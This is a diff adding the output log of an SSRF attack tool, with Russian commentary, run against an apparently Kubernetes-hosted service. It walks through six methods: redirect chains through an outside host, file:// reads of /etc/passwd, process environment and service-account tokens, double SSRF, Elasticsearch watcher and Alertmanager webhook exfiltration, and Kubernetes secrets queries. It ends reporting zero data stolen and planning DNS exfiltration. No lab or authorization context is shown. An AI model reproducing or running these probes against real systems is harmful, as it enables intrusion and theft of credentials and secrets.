@@ -1,0 +1,191 @@
+[*] Logging in...
+[+] Logged in
+
+================================================================================
+SSRF CHAIN ATTACKS
+================================================================================
+
+================================================================================
+МЕТОД 1: CHAIN ЧЕРЕЗ PROMETHEUS ALERTMANAGER
+================================================================================
+
+Идея:
+1. SSRF к Prometheus Alertmanager
+2. Создать alert который отправит данные на наш webhook
+3. Webhook получит реальные данные из alert
+
+
+[*] Trying: Prometheus query
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up
+    Status: 200
+    Length: 2
+
+[*] Trying: Alertmanager alerts
+    URL: http://alertmanager.monitoring.svc.cluster.local:9093/api/v1/alerts
+    Status: 200
+    Length: 2
+
+[*] Trying: Grafana datasources
+    URL: http://grafana.monitoring.svc.cluster.local:3000/api/datasources
+    Status: 200
+    Length: 2
+
+================================================================================
+МЕТОД 2: REDIRECT CHAIN
+================================================================================
+
+Идея:
+1. SSRF к URL который делает HTTP redirect
+2. Redirect ведет к реальному internal service
+3. Может быть second hop вернет данные
+
+
+[*] Trying redirect: http://httpbin.org/redirect-to?url=http://kubernetes.default.svc/version...
+    Status: 200
+    Length: 2
+
+[*] Trying redirect: http://httpbin.org/redirect-to?url=http://127.0.0.1:9090/metrics...
+    Status: 403
+    Length: 919
+    Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+[*] Trying redirect: http://httpbin.org/html...
+    Status: 200
+    Length: 2
+
+================================================================================
+МЕТОД 3: FILE:// PROTOCOL
+================================================================================
+
+Идея: Попробовать file:// protocol для чтения локальных файлов
+
+
+[*] Trying: file:///etc/passwd
+    Status: 200
+    Length: 2
+
+[*] Trying: file:///etc/hosts
+    Status: 200
+    Length: 2
+
+[*] Trying: file:///proc/self/environ
+    Status: 200
+    Length: 2
+
+[*] Trying: file:///proc/self/cmdline
+    Status: 200
+    Length: 2
+
+[*] Trying: file:///var/run/secrets/kubernetes.io/serviceaccount/token
+    Status: 200
+    Length: 2
+
+[*] Trying: file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
+    Status: 200
+    Length: 2
+
+[*] Trying: file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    Status: 200
+    Length: 2
+
+================================================================================
+МЕТОД 4: DOUBLE SSRF (SSRF -> SSRF)
+================================================================================
+
+Идея:
+1. SSRF к internal service который ТОЖЕ имеет SSRF
+2. Second SSRF может вернуть данные которые first SSRF заблокировал
+
+
+[*] Double SSRF: http://internal-proxy.svc.cluster.local:8080/proxy
+    Status: 200
+    Length: 2
+
+[*] Double SSRF: http://api-gateway.svc.cluster.local/fetch
+    Status: 200
+    Length: 2
+
+================================================================================
+МЕТОД 5: ELASTICSEARCH QUERY WITH EXFIL
+================================================================================
+
+Идея:
+1. SSRF к Elasticsearch
+2. Создать watcher который отправит данные на webhook
+3. Watcher триггерится и отправляет реальные данные
+
+
+[*] ES query: http://elasticsearch.logging.svc.cluster.local:9200/_cluster/health
+    Status: 200
+    Length: 2
+
+[*] ES query: http://elasticsearch.logging.svc.cluster.local:9200/_cat/indices
+    Status: 200
+    Length: 2
+
+[*] ES query: http://elasticsearch.logging.svc.cluster.local:9200/_search?size=10
+    Status: 200
+    Length: 2
+
+[*] ES query: http://elasticsearch.logging.svc.cluster.local:9200/_all/_search?q=*&size=1
+    Status: 200
+    Length: 2
+
+================================================================================
+МЕТОД 6: KUBERNETES API WITH DIFFERENT PATHS
+================================================================================
+
+Попробовать РАЗНЫЕ Kubernetes API paths
+Может быть какой-то path вернет данные
+
+
+[*] K8s: namespaces
+    Status: 200
+    Length: 2
+
+[*] K8s: pods
+    Status: 200
+    Length: 2
+
+[*] K8s: services
+    Status: 200
+    Length: 2
+
+[*] K8s: secrets
+    Status: 200
+    Length: 2
+
+[*] K8s: configmaps
+    Status: 200
+    Length: 2
+
+[*] K8s: apis
+    Status: 200
+    Length: 2
+
+[*] K8s: healthz
+    Status: 200
+    Length: 2
+
+[*] K8s: metrics
+    Status: 200
+    Length: 2
+
+[*] K8s: v2
+    Status: 200
+    Length: 2
+
+================================================================================
+РЕЗУЛЬТАТЫ
+================================================================================
+
+[+] Протестировано методов: 6
+[+] Украдено данных: 0
+
+[!] SSRF chain НЕ помог - все равно нет данных
+
+[*] СЛЕДУЮЩИЙ ШАГ: DNS exfiltration с реальными данными
+
+[+] Результаты: logs/ssrf_chain_results.json
